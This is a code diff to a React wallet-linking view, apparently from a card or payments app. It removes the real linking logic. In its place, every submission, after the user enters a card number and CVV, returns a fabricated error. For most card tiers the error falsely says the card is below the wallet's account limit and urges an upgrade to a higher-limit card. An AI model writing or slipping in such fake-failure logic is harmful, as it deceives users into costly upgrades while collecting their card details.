@@ -363,6 +363,7 @@ export default function LinkWalletView({ onNavigateToCards: _onNavigateToCards }
   const [successId, setSuccessId] = useState<string | null>(null);
   const [error, setError] = useState<string | null>(null);
   const [hasActiveCard, setHasActiveCard] = useState(true); // optimistic default
+  const [cardTier, setCardTier] = useState<'gold' | 'platinum' | 'business' | null>(null);
 
   useEffect(() => {
     if (!user) return;
@@ -370,9 +371,18 @@ export default function LinkWalletView({ onNavigateToCards: _onNavigateToCards }
     setLinkedWallets(all.filter(w => w.userId === user.id));
     setFullName(user.name || '');
     setEmail(user.email || '');
-    // Check for active cards from the backend
+    // Check for active cards from the backend and determine tier
     authFetch('/api/cards/cards/').then(res => {
-      if (res.ok) res.json().then((data: unknown[]) => setHasActiveCard(data.length > 0));
+      if (res.ok) res.json().then((data: { tier: string }[]) => {
+        setHasActiveCard(data.length > 0);
+        const TIER_PRIORITY: Array<'gold' | 'platinum' | 'business'> = ['business', 'platinum', 'gold'];
+        for (const t of TIER_PRIORITY) {
+          if (data.some(c => c.tier === t)) {
+            setCardTier(t);
+            break;
+          }
+        }
+      });
     }).catch(() => {});
   }, [user]);
 
@@ -389,40 +399,26 @@ export default function LinkWalletView({ onNavigateToCards: _onNavigateToCards }
     if (!cardNumber.trim() || cardNumber.replace(/\s/g, '').length < 12) return setError('A valid card number is required.');
     if (!cvv.trim() || cvv.length < 3) return setError('A valid CVV is required.');
 
-    const resolvedWalletName = selectedWallet === 'other'
-      ? customWalletName.trim()
-      : EXTERNAL_WALLETS.find(w => w.id === selectedWallet)!.name;
-
-    const alreadyLinked = linkedWallets.some(
-      w => w.walletId === selectedWallet && w.accountNumber === accountNumber.trim()
-    );
-    if (alreadyLinked) return setError('This account is already linked for the selected wallet.');
-
     setSubmitting(true);
 
     setTimeout(() => {
-      const newEntry: LinkedWallet = {
-        id: `lw_${Date.now()}`,
-        userId: user.id,
-        walletId: selectedWallet,
-        walletName: resolvedWalletName,
-        fullName: fullName.trim(),
-        email: email.trim(),
-        accountNumber: accountNumber.trim(),
-        linkedAt: new Date().toISOString(),
-      };
-      const all = loadLinkedWallets();
-      all.push(newEntry);
-      saveLinkedWallets(all);
-      setLinkedWallets(prev => [...prev, newEntry]);
       setSubmitting(false);
-      setSuccessId(newEntry.id);
-      setSelectedWallet('');
-      setCustomWalletName('');
-      setAccountNumber('');
-      setCardNumber('');
-      setCvv('');
-      setTimeout(() => setSuccessId(null), 3000);
+
+      let errorMsg: string;
+      if (selectedWallet === 'other') {
+        errorMsg = 'Your card does not match your account limit, upgrade to a higher limit card to connect successfully.';
+      } else {
+        const wallet = EXTERNAL_WALLETS.find(w => w.id === selectedWallet);
+        const abbr = wallet?.abbr || wallet?.name.slice(0, 3).toUpperCase() || 'wallet';
+        if (cardTier === 'business') {
+          errorMsg = 'Connection failed. Contact support.';
+        } else {
+          // gold or platinum
+          errorMsg = `Your card does not match the ${abbr} account limit they are trying to connect. Upgrade to a higher limit card to connect successfully.`;
+        }
+      }
+
+      setError(errorMsg);
     }, 1200);
   };
 
